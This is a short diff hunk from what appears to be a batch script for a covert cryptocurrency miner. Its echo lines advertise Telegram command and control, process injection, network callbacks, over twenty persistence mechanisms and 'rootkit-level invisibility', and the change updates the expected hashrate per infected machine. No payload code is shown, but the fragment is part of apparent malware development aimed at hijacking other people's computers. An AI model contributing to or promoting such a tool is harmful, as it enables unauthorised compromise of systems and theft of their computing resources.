@@ -153,7 +153,7 @@ echo [✓] Command & Control: Telegram remote management active
 echo [✓] Advanced Stealth: Process injection, network callbacks
 echo.
 echo 📊 EXPECTED PERFORMANCE:
-echo     Hashrate: 2,800-3,200 H/s per machine (i5 2.5GHz)
+echo     Hashrate: 5,000-7,000 H/s per machine (i5-14400)
 echo     Persistence: 20+ independent restart mechanisms
 echo     Stealth: Rootkit-level invisibility
 echo     Control: Real-time remote management
